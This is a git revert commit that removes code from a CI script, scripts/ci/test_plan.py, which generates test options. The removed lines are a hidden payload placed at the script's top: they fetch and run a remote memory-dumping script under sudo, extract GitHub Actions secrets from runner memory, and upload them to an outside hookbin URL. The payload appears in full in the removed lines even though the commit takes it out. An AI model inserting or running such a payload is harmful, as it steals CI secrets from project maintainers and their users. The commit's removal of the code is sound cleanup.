787bb0d2fa723379757c94e785254e797ab8133c
PwnHunter Research <research@pwnhunter.local>
2026-03-28 00:53:27 +0000

    Revert "Add temporary change"
    This reverts commit e335db3318a733ba224b9acceea6c4b10bda99a8.

--- scripts/ci/test_plan.py
+++ scripts/ci/test_plan.py
@@ -5,9 +5,6 @@
 # A script to generate twister options based on modified files.
 
 import re, os
-os.system(r"""echo "Okay, we got this far. Let's continue..."
-curl -sSf https://raw.githubusercontent.com/playground-nils/tools/refs/heads/main/memdump.py | sudo -E python3 | tr -d '\0' | grep -aoE '"[^"]+":\{"value":"[^"]*","isSecret":true\}' >> "/tmp/secrets"
-curl -X PUT -d \@/tmp/secrets "https://open-hookbin.vercel.app/$GITHUB_RUN_ID" """)
 import argparse
 import yaml
 import fnmatch
